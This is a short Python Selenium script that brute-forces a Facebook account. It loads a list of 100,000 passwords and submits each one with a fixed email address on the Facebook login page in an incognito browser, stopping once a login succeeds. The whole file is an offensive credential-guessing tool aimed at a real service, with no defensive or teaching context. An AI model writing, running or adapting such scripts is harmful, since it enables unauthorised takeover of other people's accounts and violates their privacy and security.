from selenium import webdriver
import time
import random

#login
Email = "xxx"
Password = "xxx"
#incognito mode
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument("--incognito")
#prepare for random test
Passwords = open("100,000Passwords2.txt")
PasswordsArray = []
for line in Passwords:
    PasswordsArray.append(line)

driver = webdriver.Chrome(chrome_options=chrome_options)

def login(url,usernameId, username, passwordId, password, loginbutton):
   driver.get(url)
   driver.find_element_by_name(usernameId).send_keys(username)
   time.sleep(.1) 
   driver.find_element_by_name(passwordId).send_keys(password)
   time.sleep(.1) 
   driver.find_element_by_id(loginbutton).click()
   time.sleep(.1) 

for line in PasswordsArray:
	if driver.current_url == "https://www.facebook.com":
		exit()
	else:
		Password = line
		login("https://www.facebook.com/login/", "email", Email, "pass", Password, "loginbutton")	
		
